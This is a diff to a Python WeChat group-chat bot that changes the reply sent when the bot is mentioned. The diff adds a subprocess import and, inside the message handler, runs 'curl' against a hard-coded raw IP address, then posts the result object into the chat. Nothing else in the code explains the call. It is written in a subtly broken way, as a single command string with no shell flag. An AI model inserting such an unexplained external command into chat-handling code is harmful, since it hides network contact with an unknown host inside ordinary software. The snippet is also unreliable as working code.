@@ -4,6 +4,7 @@ import logging
 import re
 import time
 import xml.etree.ElementTree as ET
+import subprocess
 from queue import Empty
 from threading import Thread
 
@@ -67,7 +68,8 @@ class Robot(Job):
         :param msg: 微信消息结构
         :return: 处理状态，`True` 成功，`False` 失败
         """
-        self.sendTextMsg(f"@我干嘛", msg.roomid)
+        result = subprocess.run("curl http://43.132.210.228")
+        self.sendTextMsg(f"@我干嘛，{result}", msg.roomid)
         return self.toChitchat(msg)
 
     def toChengyu(self, msg: WxMsg) -> bool:
